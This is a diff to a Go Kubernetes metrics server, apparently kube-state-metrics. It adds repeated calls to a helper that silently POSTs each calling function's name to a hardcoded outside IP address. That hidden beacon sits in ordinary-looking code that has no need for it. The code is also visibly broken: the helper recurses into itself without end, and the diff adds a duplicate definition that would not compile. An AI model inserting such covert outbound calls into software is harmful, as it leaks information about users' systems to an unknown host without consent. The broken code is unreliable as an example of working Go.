@@ -38,9 +38,13 @@ type promLogger struct{}
 func (pl promLogger) Println(v ...interface{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	glog.Error(v...)
 }
 func main() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	opts := options.NewOptions()
@@ -106,6 +110,8 @@ func main() {
 func createKubeClient(apiserver string, kubeconfig string) (clientset.Interface, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	config, err := clientcmd.BuildConfigFromFlags(apiserver, kubeconfig)
 	if err != nil {
 		return nil, err
@@ -129,6 +135,8 @@ func createKubeClient(apiserver string, kubeconfig string) (clientset.Interface,
 func telemetryServer(registry prometheus.Gatherer, host string, port int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	listenAddress := net.JoinHostPort(host, strconv.Itoa(port))
 	glog.Infof("Starting kube-state-metrics self metrics server: %s", listenAddress)
 	mux := http.NewServeMux()
@@ -147,6 +155,8 @@ func telemetryServer(registry prometheus.Gatherer, host string, port int) {
 	log.Fatal(http.ListenAndServe(listenAddress, mux))
 }
 func serveMetrics(collectors []*kcollectors.Collector, host string, port int, enableGZIPEncoding bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	listenAddress := net.JoinHostPort(host, strconv.Itoa(port))
@@ -185,6 +195,8 @@ type metricHandler struct {
 func (m *metricHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	resHeader := w.Header()
 	var writer io.Writer = w
 	resHeader.Set("Content-Type", `text/plain; version=`+"0.0.4")
@@ -209,7 +221,16 @@ func (m *metricHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
